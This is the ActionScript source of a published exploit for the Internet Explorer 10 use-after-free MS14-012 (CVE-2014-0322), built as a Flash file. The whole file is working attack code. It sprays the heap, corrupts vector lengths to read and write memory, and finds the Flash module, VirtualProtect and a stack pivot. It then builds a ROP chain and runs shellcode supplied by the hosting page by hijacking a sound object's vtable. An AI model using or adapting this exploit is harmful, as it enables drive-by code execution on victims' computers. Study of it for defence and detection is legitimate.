/* 
 * MS14-012 Internet Explorer CMarkup Use-After-Free
 * Vendor Homepage: http://www.microsoft.com
 * Version: IE 10
 * Date: 2014-03-31
 * Exploit Author: Jean-Jamil Khalife
 * Tested on: Windows 7 SP1 x64 (fr, en)
 * Flash versions tested: Adobe Flash Player (12.0.0.70, 12.0.0.77)
 * Home: http://www.hdwsec.fr
 * Blog : http://www.hdwsec.fr/blog/
 * MS14-012 / CVE-2014-0322
 *
 * Generation:
 * 		c:\mxmlc\bin>mxmlc.exe AsXploit.as -o AsXploit.swf
 * 
 */ 
 
package
{
	import __AS3__.vec.Vector;
	import flash.display.*;
	import flash.events.*;
	import flash.external.*;
	import flash.media.*;
	import flash.net.*;
	import flash.text.*;
	import flash.utils.*;
	import Math;
	import flash.system.Security;
	import flash.external.ExternalInterface;
	
	import flash.display.LoaderInfo;
	
	
	public class AsXploit extends Sprite
	{
		  public var s:Vector.<Object>;
		  public var spraysound:Vector.<Object>;
		  public var myTimer:Timer;
		  public var sound:Sound;
		  public var shellcodeObj:Array;
	  
		/* 
		*  Prepare the heap
		*  Trigger the vulnerability
		*  Exploit :)
		*/
		 public function AsXploit()
		 {
			shellcodeObj = LoaderInfo(this.root.loaderInfo).parameters.version.split(",");
			
			/* Prepare the heap */
			init_heap();
			
			/* Trigger the vulnerability */
			ExternalInterface.call("trigger");
			
			/* Check every second if the vulnerability has triggered */
			myTimer = new Timer(1000, 114096);
			myTimer.addEventListener("timer", timerHandler);
			myTimer.start();
		 }
		  
		 /*  Prepare the heap
		  *  Spray aligned vector & sound objects
		  */
		 public function init_heap():void
		 {
			var len:int = 0;
			var i:int = 0;
			
			/* Spray the integer array */
			this.s = new Vector.<Object>(0x18180);
			while (len < 0x18180)
			{
				this.s[len] = new Vector.<uint>(0x1000 / 4 - 16);
				for (i=0; i < this.s[len].length; i++)
				{
					this.s[len][i] = 0x1a1a1a1a;
				}
				
				++len;
			}
			
			/* Spray sound object ptr */
			this.sound = new Sound();
			this.spraysound = new Vector.<Object>(0x100);
			
			len = 0;
			while (len < 0x100)
			{
				this.spraysound[len] = new Vector.<Object>(0x1234);
				for (i=0; i < this.spraysound[len].length; i++)
				{
					this.spraysound[len][i] = this.sound;
				}
				++len;
			}
		}
		
		/*
		 *  Read an INT value in memory
		 */
		public function readInt(u1:int, u2:int, mod:uint):int
		{	
			var valres:uint = 0;
			
			if (mod == 1){
				valres = ((u1 & 0xFFFFFF00)/0x100) + (u2&0xFF)*0x1000000;
			}
			else if (mod == 2){
				valres = ((u1 & 0xFFFF0000)/0x10000) + (u2&0xFFFF)*0x10000;
			}
			else if (mod == 3){
				valres = ((u1 & 0xFF000000)/0x1000000) + (u2&0xFFFFFF)*0x100;
			}
			else
			{
				valres = u1;
			}
			
			return valres;
		}
		
		
		/*
		 *  Search a stack pivot dynamically
		 *  baseflashaddr_off: flash dll base address offset
		 *  index: index of vectors table
		 *  offset: offset to get the Stackpivot RVA
		 */
		public function getSP(baseflashaddr_off:uint, index:uint, offset:uint):uint
		{
			var sp:uint = 0;
			var sn:uint = 0;
			var secname:uint = 0;
			var sec:uint = 0;
			var peindex:uint = 0;
			var virtualSize:uint = 0;
			var virtualAddr:uint = 0;
			var i:uint = 0;
			
			/* Find .text */
			peindex = this.s[index][baseflashaddr_off+0x3C/4];
			sn = this.s[index][baseflashaddr_off+peindex/4+1] >> 16;
			
			/* Find 0xC394 */
			for (sec=0; sec < sn; sec++)
			{
				if (this.s[index][baseflashaddr_off+peindex/4+0xF8/4+(sec*0x28)/4] == 0x7865742E
					&&	this.s[index][baseflashaddr_off+peindex/4+0xF8/4+(sec*0x28)/4+1] == 0x74)
				{
					virtualAddr = this.s[index][baseflashaddr_off+peindex/4+0xF8/4+(sec*0x28)/4+3];
					virtualSize = this.s[index][baseflashaddr_off+peindex/4+0xF8/4+(sec*0x28)/4+2];					
					
					/* Find a stack pivot */
					for (i=0; i < virtualSize/4; i++)
					{
						if ((this.s[index][baseflashaddr_off+virtualAddr/4+i] & 0xFFFF) != 0xC394)
						{
							if ((this.s[index][baseflashaddr_off+virtualAddr/4+i] & 0xFFFF00 ) != 0xC39400)
							{
								if ((this.s[index][baseflashaddr_off+virtualAddr/4+i] & 0xFFFF0000 ) != 0xC3940000)
								{
									if ((this.s[index][baseflashaddr_off+virtualAddr/4+i] & 0xFF000000 ) == 0x94000000
										&& (this.s[index][baseflashaddr_off+virtualAddr/4 + i + 1] & 0xFF ) == 0xC3)
									{
										sp = virtualAddr + i*4 + 3;
										break;
									}
								}
								else
								{
									sp = virtualAddr + i*4 + 2;
									break;
								}
							}
							else
							{
								sp = virtualAddr + i*4 + 1;
								break;
							}
						}
						else
						{
							sp = virtualAddr + i*4;
							break;
						}
					}
				}
				
			}
		
			if (sp != 0)
				sp = offset+sp;
			
			return sp;
		}
		
		/*
		 *  Build & Insert the stack pivot + ROP + Shellcode
		 *  Corrupt sound object vtable ptr
		 *  baseflashaddr_off: flash dll address offset
		 *  index: vectors table index
		 *  cvaddr: corrupted vector address
		 *  virtualprotectaddr: virtual protect address
		 *  sp: stack pivot address
		 */
		public function buildPayload(baseflashaddr_off:uint, index:uint, j:uint, cvaddr:uint, virtualprotectaddr:uint, sp:uint ):void
		{
			var dec:uint = 0;
			var soundobjref:uint = 0;
			var soundobjaddr:uint = 0;
			var sh:uint=0x300;
			var i:uint = 0;
		
			/* Corrupt sound object vtable ptr */
			while (1)
			{
				if (this.s[index][j] == 0x00010c00 && this.s[index][j+0x09] == 0x1234)
				{	
					soundobjref = this.s[index][j+0x0A];
					dec = soundobjref-cvaddr-1;
					this.s[index][dec/4-2] = cvaddr+2*4+4*4;
					break;
				}
				
				j++;
			}
			
			/*  Stack pivot */
			for (i=0; i < 0x200; i++)
				this.s[index][i] = sp;
			
			/* ROP */
			this.s[index][0] = 0x41414141;
			this.s[index][1] = 0x41414141;
			this.s[index][2] = 0x41414141;
			this.s[index][3] = 0x41414141;
			this.s[index][4] = virtualprotectaddr;
			this.s[index][5] = cvaddr+0xC00+8;
			this.s[index][6] = cvaddr;
			this.s[index][7] = 0x4000;
			this.s[index][8] = 0x40;
			this.s[index][9] = 0x1a002000;
			
			/* Shellcode */
			for(var u:String in shellcodeObj)
			{
				this.s[index][sh++] = Number(shellcodeObj[u]);
			}
		}
		
		
		/*
		 *  Get flash module base address
		 *  index: index of vectors table
		 *  cvaddr: corrupted vector address
		 */
		public function getFlashBaseAddr(index:uint, cvaddr:uint):Array
		{
			var baseflashaddr_off:uint = 0;
			var j:int = 0;
			var k:int = 0;
			var kmax:uint = 0;
			var vtableobj:int = 0;
			var ocxinfo:Array = new Array();
			
			
			while (1)
			{
				if (this.s[index][j] == 0x00010c00)
				{
					vtableobj = this.s[index][j+0x08] & 0xFFFF0000;
								
					/* Get ocx base address */
					k = 0;
					while (1)
					{
						if (this.s[index][(vtableobj-cvaddr-k)/4 - 2] == 0x00905A4D)
						{	
							baseflashaddr_off = (vtableobj-cvaddr-k)/4 - 2;
							ocxinfo[0] = baseflashaddr_off;
							ocxinfo[1] = j;
							ocxinfo[2] = k;
							ocxinfo[3] = vtableobj;
									
							return ocxinfo;
						}
							
						k = k + 0x1000;
					}
				}
			
				j = j + 0x1;
			}
			
			return ocxinfo;						
		}

		/*
		 *  Find kernel32.dll index
		 *  index: index of vectors table
		 *  baseflashaddr_off: flash dll address offset
		 *  importsindex: offset to the imports table
		 */
		public function getK32Index(index:uint, baseflashaddr_off:uint, importsindex:uint):uint
		{
			var nameindex:uint = 0;
			var dllname:int = 0;
			var nameaddr:int = 0;
						
			do
			{	
				nameaddr = this.s[index][baseflashaddr_off+importsindex/4+nameindex/4+0x0C/4];
											
				/* kernel32.dll not found */
				if (nameaddr == 0x0)
					break;
				
				dllname = readInt (this.s[index][baseflashaddr_off+(nameaddr-(nameaddr % 4))/4], this.s[index][baseflashaddr_off+(nameaddr-(nameaddr % 4))/4+1], (nameaddr % 4));

				/* Check kernel32.dll */
				if (dllname == 0x6E72656B || dllname == 0x4E52454B)
				{
					nameaddr = nameaddr + 4;
					dllname = readInt (this.s[index][baseflashaddr_off+(nameaddr-(nameaddr % 4))/4], this.s[index][baseflashaddr_off+(nameaddr-(nameaddr % 4))/4+1], (nameaddr % 4));
					if (dllname == 0x32336C65 || dllname == 0x32334C45)
					{
						nameaddr = nameaddr + 4;
						dllname = readInt (this.s[index][baseflashaddr_off+(nameaddr-(nameaddr % 4))/4], this.s[index][baseflashaddr_off+(nameaddr-(nameaddr % 4))/4+1], (nameaddr % 4));
						if (dllname == 0x6C6C642E || dllname == 0x4C4C442E)
						{
							return nameindex;
						}
					}
				}
				
				/* Next dll */
				nameindex = nameindex + 0x14;
			}
			while (1);
			
			return 0;
		}

		/*
		 *  Get VirtualProtectStub() addr
		 */
		public function GetVirtualProtectStubAddr(index:uint, baseflashaddr_off:uint, fct_addr_offset:uint, fct_name_offset:uint):uint
		{
			var fct_addr:uint = 0;
			var fct_name:uint = 0;
			var fct_name_struct:uint = 0;
			
			do
			{
				fct_addr = readInt(this.s[index][baseflashaddr_off+(fct_addr_offset-(fct_addr_offset % 4))/4], this.s[index][baseflashaddr_off+(fct_addr_offset-(fct_addr_offset % 4))/4+1], (fct_addr_offset % 4));
				fct_name_struct = readInt(this.s[index][baseflashaddr_off+(fct_name_offset-(fct_name_offset % 4))/4], this.s[index][baseflashaddr_off+(fct_name_offset-(fct_name_offset % 4))/4+1], (fct_name_offset % 4));
				
				/* VirtualProtectStub() not found */
				if (fct_addr == 0 || fct_name_struct == 0)
					break;
				
				if ((fct_name_struct & 0x80000000) != 0x80000000)
				{
					fct_name_struct = fct_name_struct + 2;
					fct_name = readInt(this.s[index][baseflashaddr_off+(fct_name_struct-(fct_name_struct % 4))/4], this.s[index][baseflashaddr_off+(fct_name_struct-(fct_name_struct % 4))/4+1], (fct_name_struct % 4));
					
					/* Check VirtualProtect */
					if (fct_name == 0x74726956 || fct_name == 0x54524956)
					{
						fct_name_struct = fct_name_struct + 4;
						fct_name = readInt(this.s[index][baseflashaddr_off+(fct_name_struct-(fct_name_struct % 4))/4], this.s[index][baseflashaddr_off+(fct_name_struct-(fct_name_struct % 4))/4+1], (fct_name_struct % 4));
						if (fct_name == 0x504c4155 || fct_name == 0x506c6175)
						{
							fct_name_struct = fct_name_struct + 4;
							fct_name = readInt(this.s[index][baseflashaddr_off+(fct_name_struct-(fct_name_struct % 4))/4], this.s[index][baseflashaddr_off+(fct_name_struct-(fct_name_struct % 4))/4+1], (fct_name_struct % 4));
							if (fct_name == 0x45544f52 || fct_name == 0x65746f72)
							{
								return fct_addr;
							}
						}
					}
				}
				
				/* Next Function() */
				fct_addr_offset = fct_addr_offset + 0x4;
				fct_name_offset = fct_name_offset + 0x4;
			}
			while (1);
			
			return 0;
		}
		
		/*
		 *  Get corrupted vector index
		 */
		public function  getCorruptedVectorIndex():uint
		{
			var i:uint = 0;
			for (i=0; i < this.s.length; i++)
			{
				if (this.s[i].length == 0x3FFFFFFF)
				{
					return i;
				}
			}
			
			return i;
		}
		
		/*
		 *  Corrupt next vector size
		 */
		public function  corruptNextVector(index:uint):uint
		{
			var j:uint = 0;
			
			for (j=0; j < this.s.length; j++)
			{
				if (this.s[index][j] == 0x000003F0)
				{
					this.s[index][j] = 0x3FFFFFFF;
					
					return j;
				}
				
				j = j + 1;
			}
			
			
			
			return 0;
		}
		
		/*
		 *  Perform the exploitation
		 *  - Find VirtualProtect()
		 *  - Find a stack pivot
		 *  - Build payload (SP + ROP + SC)
		 *  - Run payload
		 */
		public function timerHandler(event:TimerEvent):void 
		{			
			var i:int = 0;
			var j:int = 0;
			var k:int = 0;
			
			var vtableobj:int = 0;
			var peindex:int = 0;
			var importsindex:int = 0;
			var k32index:int = 0;
			var fct_name_offset:uint = 0;
			var fct_addr_offset:uint = 0;
			
			var baseflashaddr_off:int = 0;	/* Base address of the flash dll */
			var vp_addr:uint = 0;	/* VirtualProtectStub() addr */
			var stackpivot:uint = 0;	/* Stackpivot address */
			
			var cvaddr:int = 0x1a001000;	/* corrupted vector address */
			var ocxinfo:Array;
			var i2:uint = 0;
			
			/* Search the corrupted vector */
			for (i=0; i < this.s.length; i++)
			{
				/* Find corrupted vector */
				if (this.s[i].length == 0x010003f0)
				{
					this.myTimer.stop();

					/* Corrupt next vector size */
					if (corruptNextVector(i) == 0)
						return;
					
					/* Find corrupted vector */
					i2 = getCorruptedVectorIndex();
					if (i2 == 0) return;
					
					/* Get flash base addr */
					ocxinfo = getFlashBaseAddr(i2, cvaddr);
					if (ocxinfo.length == 0) return;
					baseflashaddr_off = ocxinfo[0];
					j = ocxinfo[1];
					k = ocxinfo[2];
					vtableobj = ocxinfo[3];
			
					/* Get imports table */
					peindex = this.s[i2][baseflashaddr_off+0x3C/4];
					importsindex = this.s[i2][baseflashaddr_off+peindex/4+(0x18+0x60+0x8)/4];
					
					/* Find kernel32.dll */
					k32index = getK32Index(i2, baseflashaddr_off, importsindex);
					if (k32index == 0) return;

					fct_addr_offset = this.s[i2][baseflashaddr_off+importsindex/4+k32index/4+0x10/4];
					fct_name_offset = this.s[i2][baseflashaddr_off+importsindex/4+k32index/4];
					
					/* Find VirtualProtectStub() addr */
					vp_addr = GetVirtualProtectStubAddr(i2, baseflashaddr_off, fct_addr_offset, fct_name_offset);
					if (vp_addr == 0) return;
					
					/* Search Stack Pivot */
					stackpivot = getSP(baseflashaddr_off, i2, vtableobj-k);
					if (stackpivot == 0) return;

					/* Build Payload */
					buildPayload(baseflashaddr_off, i2, j, cvaddr, vp_addr, stackpivot);

					/* Run Payload */
					this.sound.toString();
					
					return;
				}
			}
		}
	}
}